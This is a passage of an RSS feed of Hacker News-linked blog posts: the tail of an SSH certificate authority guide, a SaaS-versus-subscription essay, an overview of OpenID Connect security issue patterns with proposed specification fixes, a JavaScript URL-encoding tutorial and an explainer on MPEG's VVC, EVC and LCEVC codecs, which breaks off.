</code></pre><ol start="2"><li>Copy certifcate to the client under <code>&lt;userhome&gt;/.ssh</code></li><li>Copy CA Host Public Key (<code>ca_host_key.pub</code>) to the client and put it either in known_hosts file under <code>&lt;userhome&gt;/.ssh</code> (local) or <code>/etc/known_hosts</code> (global) file in the following format:</li></ol><pre><code>@cert-authority *.dbsentry.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDN4F3JKuAS1V0nQmBRNl5fS8dZS49FKUp5wwy8R0wDcNYdrq+M5/tdS6K/R07445VWpVKwExZGboaQ/YR5iQ392YHM55ThMjSP5CTywmiP033MX3zG5eO9Iec5fz/hHtwrDtxb4Xm3FfGhXjjKTozNf/uMcOjIM1STr/I6t2zfZ42bnCq4DFj1GWHSrOtnxjN0PPOfCLH+1AmKhEUFqf0NBD3CQoPamaRVf4ouAc9KxOLFge+gebJe9jmqkaVHYfZD2CPoLVGHXZCphSQ3gyEKpvgD8VnfU9/la6BNtcK9lSONZWLFcw523HdlnbGVz+t15zZAXLu/3H6yK5SPC/L 
</code></pre><p>Above instructs SSH client to trust host certificate signed by the CA.
4. Test ssh. You should not receive TOFU warning and should not be asked for the password either. The generated certificate should work for the principals (i.e. users on server) for the validity period.</p><h2 id="summation">Summation</h2><p>In this article, I have demonstrated setup of SSH Certifciate Authority and why and how SSH authentication use SSH certificates.</p><p><code>&lt;Shameless-Plug&gt;</code><br>Although the use of certificates results in more secure SSH authentication, SSH CA adds the burden of ssh certificate management. To ease that burden one can use a centralized system such as
<a href="https://keyper.dbsentry.com/" target="_blank" rel="noopener">Keyper</a>. Keyper is an Open Source SSH Key and Certificate-Based Authentication Manager. Keyper acts as an SSH Certificate Authority (CA) and it standardizes and centralizes the storage of SSH public keys and SSH Certificates for all Linux users in your organization saving significant time and effort it takes to manage SSH public keys and certificates on each Linux Server. Keyper also maintains an active Key Revocation List, which prevents the use of Key/Cert once revoked. Keyper is a lightweight container taking less than 100MB. It is launched either using Docker or Podman. You can be up and running within minutes instead of days.<br><code>&lt;/Shameless-Plug&gt;</code></p><p>Thats it folks! Happy more secure SSH’ing.</p></div></div>]]>
            </description>
            <link>https://keyper.dbsentry.com/post/sshca/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948738</guid>
            <pubDate>Sat, 31 Oct 2020 02:41:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS vs. Subscription]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948666">thread link</a>) | @Lukas1994
<br/>
October 30, 2020 | https://www.causal.app/blog/saas-vs-subscription | <a href="https://web.archive.org/web/*/https://www.causal.app/blog/saas-vs-subscription">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Note:&nbsp;this was originally published at </em><a href="https://alexoppenheimer.substack.com/" target="_blank"><em>https://alexoppenheimer.substack.com/</em></a></p><p>The three key characteristics of a SaaS company are: subscription, high margin, and scalability. There are so many new business models and new applications of existing business models into new markets that capture one or two of these, but in order to get the high multiples that SaaS companies achieve, it's critical to have all three. In addition, the "rule of thumb" metrics that I previously mentioned don't work so well in the absence of any of these characteristics. While the fundamental subscription math remains true, you have to dig much deeper to understand the impact on the cash flows, working capital needs, scalability, customer lifetime value and long term profitability to be able to assess the health and viability of a business.</p><p>For example, if we look at <a href="https://www.lemonade.com/">Lemonade</a>, which priced its IPO today (<a href="https://www.sec.gov/Archives/edgar/data/1691421/000104746920003943/a2242013z424b4.htm">424B4 here</a>). Lemonade is a technology-enabled insurance company and insurance broker. I think most people would agree that it is not a software company. But if we look through the lens of these three characteristics and some of the key metrics, we can learn a lot about its long term prospects as a business.</p><ol role="list"><li><strong>Subscription:</strong> Insurance is probably one of the original subscription businesses, with people paying annual or monthly premiums. Revenue comes in regularly to support the clients’ claims.</li><li><strong>Scalability:</strong> Assuming there's access to re-insurance and the capital to back up the insurance plans, this business is highly scalable and in a huge market.</li><li><strong>Margins:</strong> This is where it gets a bit more complicated. This is not a 90% margin, AWS-expense only business. It's a complicated financial cycle and risk assessment business with very different capital, accounting and cash flow dynamics. Lemonade runs a few different businesses with varying risk ownership which have an impact on gross profit, and overall they achieved a gross margin of 17% in 2019.</li></ol><p>Now let's take a look at some of the key metrics:</p><ol role="list"><li><strong>LTV</strong>: In most software businesses, especially those either creating or selling into new markets, it's almost impossible to calculate a lifetime value because we don't have enough data on the lifetime of a customer. In the insurance business, there's tons of data going back decades for hundreds of millions of people. Insurance companies run on actuarial science, which one could argue is the original data science application. To put it lightly, they understand data and have lots of it. While in a new-fangled enterprise or consumer software business, lifetime value is a shot in the dark, in the insurance business it's not, where it's reasonable to expect your customers to stay with you for 25+ years.</li><li><strong>CAC Payback</strong>: Knowing you can keep your customers for a very long time is great and now you can calculate the CAC you can afford to invest in order to acquire them. Lemonade runs efficiently now with $1 of marketing to $2 of in-force premium on their platform. Gross margin-adjusted this obviously shifts the timeline out, but that's OK because the likelihood of keeping the customers for a long time is high. This introduces a new question: capital. With short paybacks, cash management isn't so much of a challenge, but as those payback times increase, so does the need to fund the working capital needs of the business. The time value of money becomes a factor here, but is manageable and calculable.</li></ol><p>So a quick look through the lens of the fundamental subscription concepts makes it clear that even though Lemonade is not a software business, it is a subscription business with some highly favorable business and customer economics.</p><p>And congrats to the Lemonade team on the IPO!</p><figure><p><img src="https://uploads-ssl.webflow.com/5e8a043bfbc2c035b4d8e5b5/5f6128d02bc85546e3a93976_https%253A%252F%252Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%252Fpublic%252Fimages%252Faa34c7a7-d833-453f-a3cb-79b88beb7eda_1536x1025.jpeg" alt=""></p></figure><p>‍</p></div></div>]]>
            </description>
            <link>https://www.causal.app/blog/saas-vs-subscription</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948666</guid>
            <pubDate>Sat, 31 Oct 2020 02:24:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Real-life OIDC Security (I): Overview]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948626">thread link</a>) | @mooreds
<br/>
October 30, 2020 | https://security.lauritz-holtmann.de/post/sso-security-overview/ | <a href="https://web.archive.org/web/*/https://security.lauritz-holtmann.de/post/sso-security-overview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
      
  
  <article>

    <header>
      <p>
          
        POSTS
      </p>
      
      
      <time datetime="2020-10-30T18:21:19+02:00">October 30, 2020</time>      
      
      
    </header>

    <section><p>This is the <em>first</em> post of a series on Single Sign-On and OpenID Connect 1.0 security. This post presents a high-level overview of observed issue patterns during my research on real-life OIDC security and proposes additions to the specification’s security considerations.</p>
<p>The series will approximately consist of the following posts:</p>
<ol>
<li><a href="https://security.lauritz-holtmann.de/post/sso-security-overview/">[Overview] <strong>Common Issue Patterns and Derived Security Considerations</strong></a></li>
<li><a href="#">[Implementation] Login Confusion</a> (2020-11-03)</li>
<li><a href="#">[Implementation] Injection of CRLF sequences</a> <em>(2020-11-05)</em></li>
<li><a href="#">[Implementation] SSRF issues in real-life OIDC implementations</a>  <em>(2020-11-10)</em></li>
<li><a href="#">[Specification] Redirect URI Schemes</a>  <em>(2020-11-12)</em></li>
<li><a href="#">[Specification] Reusable State parameter</a>  <em>(2020-11-17)</em></li>
<li><a href="#">[Responsible Disclosure] Lessons learned during Responsible Disclosure of OIDC/OAuth related issues</a>  <em>(2020-11-19)</em></li>
</ol>
<p>As you can see, the series is structured in an <em>[Overview]</em>, attacks with concrete examples categorized as <em>[Implementation]</em> flaws and <em>[Specification]</em> flaws, and finally lessons learned during the <em>[Responsible Disclosure]</em>.  <br>
Note that <em>this</em> post describes the overall patterns and considerations derived during my research. The following posts in this series will give detailed examples of vulnerabilities that were found in real-life OpenID Connect implementations.</p>
<blockquote>
<h3 id="acknowledgment">Acknowledgment</h3>
<p>We made the observations within this advisory during the research for my master’s thesis on “<em>Single Sign-On Security: Security Analysis of real-life OpenID Connect Implementations</em>”. The thesis was written at the <a href="https://www.nds.ruhr-uni-bochum.de/chair/news/">chair for network and data security</a> of <a href="https://www.ruhr-uni-bochum.de/">Ruhr University Bochum</a>.</p>
<p>The advisors of my thesis are <a href="https://twitter.com/CheariX">Dr.-Ing. Christian Mainka (@CheariX)</a>, <a href="https://twitter.com/v_mladenov">Dr.-Ing. Vladislav Mladenov (@v_mladenov)</a> and <a href="https://twitter.com/JoergSchwenk">Prof. Dr. Jörg Schwenk (@JoergSchwenk)</a>. Huge “Thank you” for your continuous support! 🙂</p>
</blockquote>
<h2 id="introduction">Introduction</h2>
<p>This post outlines the lessons learned during the research on the security of real-life OpenID Connect implementations.
We presume basic knowledge of OpenID Connect 1.0 and OAuth 2.0 for this post.</p>
<p>First, we outline a high-level overview of the selection criteria. Afterward, we describe patterns that were regularly observed during the analysis of real-life OpenID Connect Service Provider and Identity Provider implementations.
Finally, proposals for adjusted security considerations regarding the OpenID Connect specification are derived.</p>
<h2 id="high-level-setup-and-selection-of-implementations">High-Level Setup and Selection of Implementations</h2>
<p>During the analysis, we evaluated OIDC Identity Provider and Service Provider implementations regarding a defined set of assertions, based on the specification’s security considerations [2, Section 16][3] and the OAuth 2.0 Security Best Current Practices [1]. In doing so, we analyzed self-hosted software <em>and</em> hosted services. For Service Providers, we considered the ability to configure custom Identity Providers as mandatory.</p>
<p>The following software and services were analyzed:</p>
<ul>
<li><a href="https://www.keycloak.org/">Keycloak (Red Hat)</a></li>
<li><a href="https://www.atlassian.com/software/bitbucket">Bitbucket Server (Atlassian)</a></li>
<li><a href="https://about.gitlab.com/">GitLab</a></li>
<li><a href="https://www.salesforce.com/">Salesforce Lightning</a></li>
<li><a href="https://aws.amazon.com/cognito/">Amazon Cognito (AWS)</a></li>
</ul>
<h2 id="derived-issue-patterns">Derived Issue Patterns</h2>
<p>In the following, we outline <em>seven</em> issue patterns that we derived within our test-set.  <br>
<em>Reminder: This post aims to give an overview. We discuss novel patterns and the most relevant observations in detail in dedicated posts.</em></p>
<h3 id="pattern-1-redirect-uri-schemes">Pattern 1: Redirect URI Schemes</h3>
<p>The OpenID Connect Core specification is quite vague regarding allowed schemes for <code>redirect_uri</code> values, see [2, Section 3.1.2.1]:</p>
<blockquote>
<p>REQUIRED. Redirection URI to which the response will be sent. This URI MUST exactly match one of the Redirection URI values for the Client pre-registered at the OpenID Provider, with the matching performed as described in Section 6.2.1 of [RFC3986] (Simple String Comparison). When using this flow, the Redirection URI <strong>SHOULD use the https scheme</strong>; however, <strong>it MAY use the http scheme</strong>, provided that the Client Type is confidential, as defined in Section 2.1 of OAuth 2.0, and provided the OP allows the use of http Redirection URIs in this case. The Redirection URI <strong>MAY use an alternate scheme</strong>, such as one that is intended to identify a callback into a native application.</p>
</blockquote>
<p>We observed that multiple Identity Providers support pre-registering <code>redirect_uri</code> values with any possible scheme. Such schemes' support is potentially dangerous, as browsers treat risky schemes like <em>data</em> or <em>javascript</em> very differently (some of my test cases can be found <a href="https://security.lauritz-holtmann.de/files/evaluation_results.xlsx">here</a>, recently <em>quinn</em> found an interesting vector for Firefox using the <a href="https://www.gremwell.com/firefox-xss-302"><em>ws</em> scheme</a>).  <br>
Additionally, the specification defined the <code>redirect_uri</code> vague because it had native clients in mind. There are very few legitimate use-cases for these schemes as <code>redirect_uri</code> values in OpenID Connect setups.</p>
<h3 id="pattern-2-server-side-request-forgery">Pattern 2: Server-Side-Request-Forgery</h3>
<p>Multiple Identity and Service Provider implementations were vulnerable to different types of Server-Side Request Forgery (SSRF) vulnerabilities.
The Identity Provider’s <code>request_uri</code> parameter is already known to be vulnerable for SSRF by design since 2017 [4, Section III;A. 8)]. Notably, this vulnerability could be exploited by any unauthenticated user.</p>
<p>In 2017, Mladenov and Mainka pointed out [5, Section 2.1.2] that a malicious <em>Discovery Service</em> could be used to launch a SSRF attack against a Service Provider. Thus, the attacker can use SSRF for port scans or for retrieving data.
Additionally, having access to the endpoint configuration, administrative users could launch SSRF attacks on the Service Provider by design. Depending on the actual setup, this yields to severe security implications, especially considering hosted and <em>cloud</em> services.</p>
<p>Even though these issues were theoretically discussed earlier, SSRF to <em>private IPs</em> or <em>localhost</em> was a common and serious issue among our test-set.</p>
<h3 id="pattern-3-tls-enforcement">Pattern 3: TLS Enforcement</h3>
<p>The OpenID Connect Core specification already enforces TLS for communication with <em>Authentication</em>, <em>Token</em>, and <em>UserInfo Endpoint</em>, so does the OpenID Connect Dynamic Client Registration regarding the <em>Client Configuration Endpoint</em>. Nevertheless, most of the analyzed implementations allowed performing the discovery using unencrypted communication or allowed to specify OpenID Connect endpoints using HTTP without TLS.</p>
<h3 id="pattern-4-leakage-via-error-pages">Pattern 4: Leakage via Error Pages</h3>
<p>Error messages and pages need extra attention. We discovered that multiple Service Provider implementations presented error pages as a direct response to  <em>Authentication Responses</em> [2, Section 3.1.2.5.]. As a result, this page’s GET parameters include OpenID Connect values like <code>state</code> and <code>code</code>.  External resources like images, scripts, styles, or links to external resources on can be on any endpoint. In these cases, the attacker can retrieve sensitive information, including OpenID Connect parameters, in query parameters or the <code>Referer header</code>. <!-- raw HTML omitted --></p>
<h3 id="pattern-5-csrf">Pattern 5: CSRF</h3>
<p>The Service Provider’s <em>Initiate Login Endpoint</em> implements Login Cross-Site-Request-Forgery (CSRF) by design and per specification [2, Section 4.]. This behavior is well known and was previously discussed [4, Section III; A. 7)].
Besides this endpoint, we observed non-normative endpoints that start an external OpenID Connect login without CSRF protection as well. If the <code>state</code> is correctly validated, these endpoints still allow to log in a victim End-User into her own account ("<em>Login CSRF</em>").</p>
<p>If there are additional non-normative parameters that indicate where the End-User should be redirected to after successful authentication (i.e., “next”, “nextUrl”, …) and these parameters allow specifying the
<em>Login Initiation Endpoint</em> or non-normative endpoints that start external OIDC login flows, <strong>Login Confusion attacks</strong> are possible. Technical details for this novel attack will be given in the next post of this series.</p>
<h3 id="pattern-6-state-parameter-handling">Pattern 6: State parameter handling</h3>
<p>OpenID Connect <code>state</code> parameter handling at the Service Provider’s <em>Redirection Endpoint</em> showed multiple more common issues. Some of the analyzed implementations did not handle the unexpected behavior of not receiving a <code>state</code> within the <em>Authentication Response</em> if it was present within the <em>Authentication Request</em>. As a result, unhandled exceptions occurred. Depending on the actual implementation, this may lead to sensitive information disclosure or availability issues.
Further, multiple implementations correctly bound the <code>state</code> to the user session. Still, they failed to make it one-time-usable, increasing the attack surface for token-reuse and Denial-of-Service Amplification attacks (we give the technical details behind this attack in a future blog post).</p>
<h3 id="pattern-7-injection-of-metacharacters">Pattern 7: Injection of Metacharacters</h3>
<p>Service Providers often treat contents provided by Identity Providers as trustworthy. In our research, we show that this behavior in general yields injection issues (previously outlined as “Injection Attacks” by Mainka et al. in [5, Section 2.1.3]).
Striking among the test-set were <em>CRLF</em>-related issues, as missing sanitization can lead to HTTP header injections in Service Provider initiated requests and injections to application log files.</p>
<h2 id="derived-openid-connect-security-considerations">Derived OpenID Connect Security Considerations</h2>
<p>In addition to previously known security considerations [1][2, Section 16.][5], it has been shown that the following aspects need extra attention. Some of these considerations have been made earlier but with a less severe indication. In terms of RFCs and specifications, this would mean that a “MAY” or “SHOULD” would become a “MUST”.</p>
<ol>
<li>The specification needs to be tightened regarding the <code>redirect_uri</code> definition. This URI scheme should NOT be <em>data</em>, <em>javascript</em>, <em>vbscript</em>, or any other scheme that is not <em>HTTP(S)</em> or related to a dedicated native client.</li>
<li>The Identity Provider SHOULD restrict allowed <code>request_uri</code> values by allowing the Service Provider to specify the <code>request_uris</code> parameter that is an “[…] array of request_uri values […]”, at registration [6, Section 2.].
Currently, only if the OpenID Connect Dynamic Client Registration is used, the Identity Provider can require the Service Provider to “[…] pre-register <code>request_uri</code> values using the <code>request_u…</code></li></ol></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://security.lauritz-holtmann.de/post/sso-security-overview/">https://security.lauritz-holtmann.de/post/sso-security-overview/</a></em></p>]]>
            </description>
            <link>https://security.lauritz-holtmann.de/post/sso-security-overview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948626</guid>
            <pubDate>Sat, 31 Oct 2020 02:13:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to encode and decode URL with JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948588">thread link</a>) | @phongduong
<br/>
October 30, 2020 | https://phongduong.dev/blog/how-to-encode-and-decode-url-with-javascript/ | <a href="https://web.archive.org/web/*/https://phongduong.dev/blog/how-to-encode-and-decode-url-with-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When you request a third-party API, you may pass parameters that contain special characters. This may cause errors for your request. To avoid this situation, you need to encode the URL before sending the request. </p>
<h2 id="encode-url">Encode URL</h2>
<p>Javascript has 2 functions that help you encode a URL:</p>
<ul>
<li><code>encodeURI()</code>: encode a full URL. It doesn't encode <code>~!@#$&amp;*()=:/,;?+'</code> </li>
<li><code>encodeURIComponent()</code>: encode a part of the URL. It doesn't encode <code>-_.!~*'()</code> </li>
</ul>
<h2 id="examples">Examples</h2>
<h3 id="encode-url-1">Encode URL</h3>
<pre><code><span>const</span> <span>URL</span> <span>=</span> <span>"https://phongduong.dev/blog/kiểm tra tiếng Việt"</span>

<span>console</span><span>.</span><span>log</span><span>(</span><span>encodeURI</span><span>(</span><span>URL</span><span>)</span><span>)</span> 
<span>console</span><span>.</span><span>log</span><span>(</span><span>encodeURIComponent</span><span>(</span><span>URL</span><span>)</span><span>)</span> </code></pre>
<h3 id="encode-parameters">Encode parameters</h3>
<pre><code><span>const</span> <span>URL</span> <span>=</span> <span>"https://phongduong.dev"</span>
<span>const</span> <span>URLParam</span> <span>=</span> <span>"https://example.com"</span>
<span>const</span> queryParam <span>=</span> <span>"Đây là tiếng Việt"</span>

<span>console</span><span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span><span>URL</span><span>}</span></span><span>?url=</span><span><span>${</span><span>encodeURIComponent</span><span>(</span><span>URLParam</span><span>)</span><span>}</span></span><span>`</span></span><span>)</span> 
<span>console</span><span>.</span><span>log</span><span>(</span><span><span>`</span><span><span>${</span><span>URL</span><span>}</span></span><span>?q=</span><span><span>${</span><span>encodeURIComponent</span><span>(</span>queryParam<span>)</span><span>}</span></span><span>`</span></span><span>)</span> </code></pre>
<h2 id="decode-url">Decode URL</h2>
<p>Javascript provides <code>decodeURI()</code> and <code>decodeURIComponent()</code>to decode a URL. You can use them to decode the corresponding encoding function's result</p>
<pre><code><span>console</span><span>.</span><span>log</span><span>(</span><span>decodeURI</span><span>(</span><span>"https://phongduong.dev/blog/ki%E1%BB%83m%20tra%20ti%E1%BA%BFng%20Vi%E1%BB%87t"</span><span>)</span><span>)</span> 
<span>console</span><span>.</span><span>log</span><span>(</span><span>decodeURIComponent</span><span>(</span><span>"https%3A%2F%2Fphongduong.dev%2Fblog%2Fki%E1%BB%83m%20tra%20ti%E1%BA%BFng%20Vi%E1%BB%87t"</span><span>)</span><span>)</span> </code></pre>
<h2 id="summary">Summary</h2>
<p>If you want to encode a full URL, use <code>encodeURI()</code>. </p>
<p>If you want to encode a part of the URL, use <code>encodeURIComponent()</code>. </p>
<p>To decode, use the corresponding function.</p>
</div></div>]]>
            </description>
            <link>https://phongduong.dev/blog/how-to-encode-and-decode-url-with-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948588</guid>
            <pubDate>Sat, 31 Oct 2020 02:05:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VVC, EVC, LCEVC – MPEG's New Video Codecs – Explainer with Lcevc Results Linked]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24948460">thread link</a>) | @ponderingfish
<br/>
October 30, 2020 | https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/ | <a href="https://web.archive.org/web/*/https://ottverse.com/vvc-evc-lcevc-mpeg-video-codecs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-vvc-lcevc-min.png?resize=678%2C381&amp;ssl=1" alt="vvc evc lcevc mpeg" title="evc-vvc-lcevc-min" data-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/evc-vvc-lcevc-min.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p><strong>MPEG is releasing three new video codecs in 2020-2021 called Versatile Video Coding (H.266), Essential Video Coding (EVC MPEG-5 Part 1), and Low Complexity Enhancement Video Coding (LCEVC MPEG-5 Part 2). Let’s take a look at the highlights of each of these codecs and what they bring to the table.</strong></p>




<h2 id="video-compression-is-critical-to-your-infrastructure"><span id="Video_Compression_is_Critical_To_Your_Infrastructure"></span>Video Compression is Critical To Your Infrastructure<span></span></h2>



<p>Video traffic is growing by the day and that is not going to stop any time soon. The pandemic might have stymied other industries, but, has actually given a filip to the streaming industry, because people are stuck indoors, and watching videos provides a much-needed escape from the daily routine!</p>



<p>Video Compression is a critical component in the video delivery pipeline and can make a massive make-or-break impression in the minds of the end-user. If you “tune” your encoders to maximize video quality, you’ll have to compromise on compression efficiency and spend more bits; and vice-versa. If you compromise on compression efficiency and create larger files, then you will have to spend more on CDN delivery costs.</p>



<p>So, the goal of every encoder team is to create a fine-balance between quality and bitrate. In other words, balance video quality with dollars.</p>



<p>The easiest way to perform this balancing act is to upgrade to the best encoder or encoding technology on the market. Hypothetically, this is simple, but practically, this is difficult. You need to make sure that the quality-complexity-efficiency trade-offs are met and decoder support is available amongst other things.</p>



<h2 id="the-failure-of-hevc"><span id="The_Failure_of_HEVC"></span>The Failure of HEVC<span></span></h2>



<p>When we talk about encoders, the discussion isn’t complete without mentioning H.264/AVC which is still ruling supreme since its introduction by MPEG (in 2003, I think). The MPEG announced a successor to H.264/AVC and called it H.265/HEVC (High Efficiency Video Coding) that had a slew of new coding tools such as quadtree decomposition, new picture types, SAO filtering, etc.</p>



<p>However, HEVC turned out to be a flop and the failure of HEVC had almost nothing to do with the algorithms. For HEVC R&amp;D teams, getting 20-30% gains over AVC was easy. </p>



<p><strong>You may disagree, but, as someone who wrote HEVC code for years, I stand by what I said.</strong></p>



<p>The “failure” of MPEG’s H.265/HEVC was due to patent-pools and licensing issues and this created the need for a new codec to fill the gap left by HEVC and to replace H.264/AVC (which by-design will struggle to compress 4K, UHD, and large resolutions).</p>



<p>In this regards, MPEG has announced that three new video codecs will soon be standardized and they are :-</p>



<ul><li>Versatile Video Coding (H.266)</li><li>Essential Video Coding (EVC MPEG-5 Part 1)</li><li>Low Complexity Enhancement Video Coding (LCEVC MPEG-5 Part 2)</li></ul>



<p>Let’s take a quick look at the objective of each of these codecs and see what gap they’re trying to plug, shall we?</p>



<h2 id="versatile-video-coding---vvc--h266"><span id="Versatile_Video_Coding_%E2%80%93_VVC_/_H_266"></span>Versatile Video Coding – VVC / H.266<span></span></h2>



<figure><img data-attachment-id="113" data-permalink="https://ottverse.com/h266_vvc/" data-orig-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="h266_vvc" data-image-description="" data-medium-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="versatile video coding vvc h266" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1024%2C576&amp;ssl=1 1024w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=300%2C169&amp;ssl=1 300w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=768%2C432&amp;ssl=1 768w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1536%2C864&amp;ssl=1 1536w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1200%2C675&amp;ssl=1 1200w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1568%2C882&amp;ssl=1 1568w, https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i2.wp.com/ottverse.com/wp-content/uploads/2020/10/h266_vvc.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>Touted as a successor to HEVC, the Versatile Video Coding standard has a lofty goal of achieving at least a 30% improvement in compression efficiency over HEVC. This should be doable considering the allowance of the “10x complexity increase” that the committee has provided.</p>



<p>In&nbsp;<a href="https://mpeg.chiariglione.org/sites/default/files/files/standards/parts/docs/w17074.zip" target="_blank" rel="noopener">the MPEG Requirements document</a>&nbsp;for VVC (H.266), a few interesting points stand out with regards to compression efficiency, coding complexity, etc.</p>



<ul><li><strong>A substantial improvement in compression efficiency compared to HEVC Main Profile is required for the target application(s);</strong>&nbsp;at no point of the entire bit rate range shall it be worse than existing standard(s).&nbsp;<strong>30% bitrate reduction for the same perceptual quality is sufficient for some important use-cases and may justify a future video coding standard</strong>. Other use-cases may require higher bit-rate reductions such as 50%.</li><li><strong>Encoding complexity of approximately 10 times or more than that of HEVC</strong>&nbsp;is acceptable for many applications.</li><li><strong>The standard shall enable the use of efficient prediction structures (e.g. so-called open groups of pictures) without compromising from the fast and seamless representation switching capability between representations of different properties, such as different spatial resolutions.</strong></li><li>Support for&nbsp;<strong>progressive scanning shall be required for all Profiles and Levels</strong>.</li></ul>



<p>What stands out to me the most in the Requirements document are the references to “<strong>fast-switching</strong>” and “<strong>progressive scanning</strong>“. This is a clear indication of the importance that the MPEG body is placing on OTT streaming&nbsp;<em>(and the implicit absence of interlaced video in OTT)</em>.</p>



<p>This was a HUGE problem in HEVC where interlaced support was an after-thought; and it lead to a lot of code-wrangling to retro-fit interlaced support into commercial codecs. I hope VVC does not tread the same interlaced path.</p>



<p>The second comment about fast-switching is interesting and might put pressure on codec vendors to insert more IDRs in the bitstream to support smaller segment sizes and clean, fast, switching between profiles in the ABR bitrate ladder. The reference to open-gops is interesting, because Open-GOPs are very helpful in increasing compression efficiency – so this is something fun to watch out for.</p>



<p>Whenever a discussion about MPEG’s video codecs comes up, the elephant in the room has to be&nbsp;<strong>licensing</strong>. Fraunhofer HHI said in their&nbsp;<a href="https://newsletter.fraunhofer.de/-viewonline2/17386/465/11/14SHcBTt/V44RELLZBp/1" target="_blank" rel="noopener">newsletter</a>&nbsp;that,</p>



<blockquote><p>A uniform and transparent licensing model based on the FRAND principle (i.e., fair, reasonable, and non-discriminatory) is planned to be established for the use of standard essential patents related to H.266/VVC. For this purpose, the Media Coding Industry Forum (MC-IF) was founded.</p></blockquote>



<p>I hope VVC pans out because I’d love to see it in action crunching 4K/8K videos!</p>



<p><strong>Read <a href="https://ottverse.com/x266-vvc-multicoreware-opensource-encoder/">OTTVerse’s update of MulticoreWare’s x266 encoder for VVC.</a></strong></p>



<p><strong>Reference</strong>&nbsp;–&nbsp;<a href="https://mpeg.chiariglione.org/standards/exploration/future-video-coding/requirements-a-future-video-coding-standard-v5" target="_blank" rel="noopener">Requirements for a Future Video Coding Standard V5</a></p>



<h2 id="essential-video-coding---evc-mpeg-5-part-1"><span id="Essential_Video_Coding_%E2%80%93_EVC_(MPEG5_Part_1)"></span>Essential Video Coding – EVC (MPEG-5 Part 1)<span></span></h2>



<p>MPEG-5 EVC or Essential Video Coding is an MPEG standard backed by Samsung, Huawei, Qualcomm, Divideon as a response to the patent pool mess that HEVC ran it that essentially stymied large-scale adoption of a powerful video compression standard.</p>



<p>The&nbsp;<a href="https://mpeg.chiariglione.org/sites/default/files/files/standards/parts/docs/w17928.zip" target="_blank" rel="noopener">requirements of the EVC standard</a>&nbsp;were very clearly specified by MPEG as follows –</p>



<ul><li>The test model should consist of two tool sets:&nbsp;<strong>a base and an enhanced tool set</strong></li><li>The base tool set should be configured with tools that were made public more than 20 years ago or for which a Type 1 declaration is received</li><li>There should be additional tools in the enhanced tool set, each of which shall provide a significant improvement in coding efficiency and be capable of being cleanly switched off on an individual basis</li></ul>



<p>EVC’s aim is crystal-clear – provide a royalty-free option for content producers while also providing adequate tools, algorithms, and knobs to produce higher quality video (than the base tool set). And, the enhancement layer’s tools (also referred to as the Main layer) will be subject to royalties.</p>



<p>Sounds good, eh?</p>



